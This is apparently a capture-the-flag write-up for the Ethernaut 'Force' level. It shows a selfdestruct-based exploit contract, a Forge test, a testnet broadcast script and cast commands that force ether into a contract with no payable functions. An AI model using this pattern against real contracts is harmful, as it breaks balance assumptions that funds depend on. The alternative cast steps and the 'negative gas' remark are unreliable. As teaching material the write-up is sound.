## 👾 07. Force

<br>


### tl; dr

<br>


* this challenge exploits smart contract invariants, and how total balance is not a good invariant.
  - contract invariants are properties of the program state that are expected to always be true. for instance, the value of `owner` state variable, the total token supply, etc., should always remain the same.
  - a state in the blockchain is considered valid when the contract-specific invariants hold true.

<br>

* in this challenge, we need to find a way to forcely send `ether` to a contract that does not explicitly contain a `payable`, a `receive()`, or a `fallback()` function.

<br>



* there are two ways this can be done when the destination contract is already deployed:
   - by using `coinbase` transactions or block rewards (like MEV searchers and validators rewards)
  - by leveraging (**[the now being deprecated](https://ethereum-magicians.org/t/deprecate-selfdestruct/11907)**) `selfdestruct(address)`, which allows contracts to receive `ether` from other contracts. 
    - all the `ether` stored in the calling contract is transferred to `address` (and since this happens at the EVM level, there is no way for the receiver to prevent it). 
    - `selfdestruct()` can be considered a garbage collection to clean up voided contracts (and it consumes negative gas).

<br>


<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/06c0c5bb-8c1f-49a4-a2a1-561d5f1fa74b">
</p>




<br>

```solidity
contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```


<br>

---

### discussion

<br>

* `Force` contract has no code and its ABI is empty, so we need to figure out how we can send `ether` to it.

<br>

* as mentioned above, we can use `selfdestruct(address)`, a function used to delete a contract from the blockchain by removing its code and storage.

<br>



----

### solution

<br>

* we craft a very simple exploit, located at `src/07/ForceExploit.sol`:

<br>

```solidity
contract ForceExploit {
    
    constructor(address payable instance) payable {
        selfdestruct(instance);
    }
}
```

<br>

* and test it with `test/07/Force.t.sol`:

<br>

```solidity
contract ForceTest is Test {

    address payable instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 

    function setUp() public {
    
        vm.prank(instance);
        vm.deal(hacker, 1 ether);
    }

    function testForceHack() public {

        vm.startPrank(hacker);
        assert(instance.balance == 0);
        ForceExploit exploit = new ForceExploit{value: 0.0005 ether}(instance);
        assert(instance.balance != 0);
        vm.stopPrank();
        
    }
}
```

<br>

* running:

<br>

```shell
> forge test --match-contract ForceTest -vvvv    
```



<br>

* then, we submit the solution with `script/07/Force.s.sol`:

<br>

```solidity
contract Exploit is Script {

    ForceExploit exploit;
    address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));     
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY")); 
    uint256 immutable initialDeposit = 0.0005 ether;  
        
    function run() external {
        vm.startBroadcast(hacker);
        exploit = new ForceExploit{value: initialDeposit}(instance);
        vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/07/Force.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>


---

### alternative solution using `cast`

<br>

* deploy the exploit with:

<br>

```shell
> forge create src/07/ForceExploit.sol:ForceExploit --constructor-args=<level address> --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

* then call the contract with:

<br>

```shell
> cast send <deployed address> --value 0.0005ether --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

----

### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



<br>


